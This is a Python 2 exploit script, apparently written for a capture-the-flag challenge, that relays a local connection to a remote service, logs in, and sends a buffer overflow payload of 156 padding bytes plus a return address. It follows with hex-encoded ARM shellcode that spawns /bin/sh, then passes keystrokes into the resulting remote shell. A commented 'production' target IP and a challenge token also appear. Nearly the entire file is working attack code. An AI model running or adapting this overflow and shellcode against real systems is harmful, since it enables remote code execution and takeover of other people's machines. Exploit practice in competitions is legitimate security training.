import socket
import gevent
import gevent.server
from gevent.socket import wait_read
import sys


# Uncomment for production
#remote = ("188.40.18.78", 1025)
remote = ("127.0.0.1", 10023)
local = ("127.0.0.1", 10024)

shellcode = "ZZZZ" + "01608fe216ff2fe178461230011e52408a600190029201a952400b2701df2f2f62696e2f736869696969".decode('hex')

def waitk():
    wait_read(sys.stdin.fileno())
    return sys.stdin.read(1)

def typein(s, text):
    for t in text:
        if t == '\xff':
            t = '\xff\xff'
        gevent.sleep(0.1)
        s.send(t)

def copier(src, dst):
    while True:
        d = src.recv(1024)
        if len(d) == 0:
            print "copier got 0..."
            break
        dst.sendall(d)

def handle(client, address):
    remote_socket = gevent.socket.socket()
    remote_socket.connect(remote)

    # Uncomment for production, after brute-forcing token
    #print remote_socket.recv(1024)
    #gevent.sleep(1)
    #remote_socket.send('3573-1419883439.0-4a0ee4c7cbbe18cf39fd76348899c861\n')
    #gevent.sleep(1)

    gevent.spawn(copier, client, remote_socket)
    gevent.spawn(copier, remote_socket, client)
    gevent.sleep(1)
    gevent.sleep(1)
    typein(remote_socket, 'mobile\n')
    gevent.sleep(1)
    typein(remote_socket, 'mobile\n')
    
    print "create new template, press enter here..."
    waitk()
    print "sending template..."
    typein(remote_socket, "A"*156 + "\x04\xc6\x01")

    print "create new message, press enter here..."
    waitk()
    print "sending message...", len(shellcode)
    print len(shellcode + "Z"*(56-len(shellcode)))
    typein(remote_socket, shellcode + "Z"*(56-len(shellcode)))

    print "press enter to get shell"
    waitk()
    while True:
        c = waitk()
        remote_socket.send(c)


server = gevent.server.StreamServer(local, handle)
server.serve_forever()
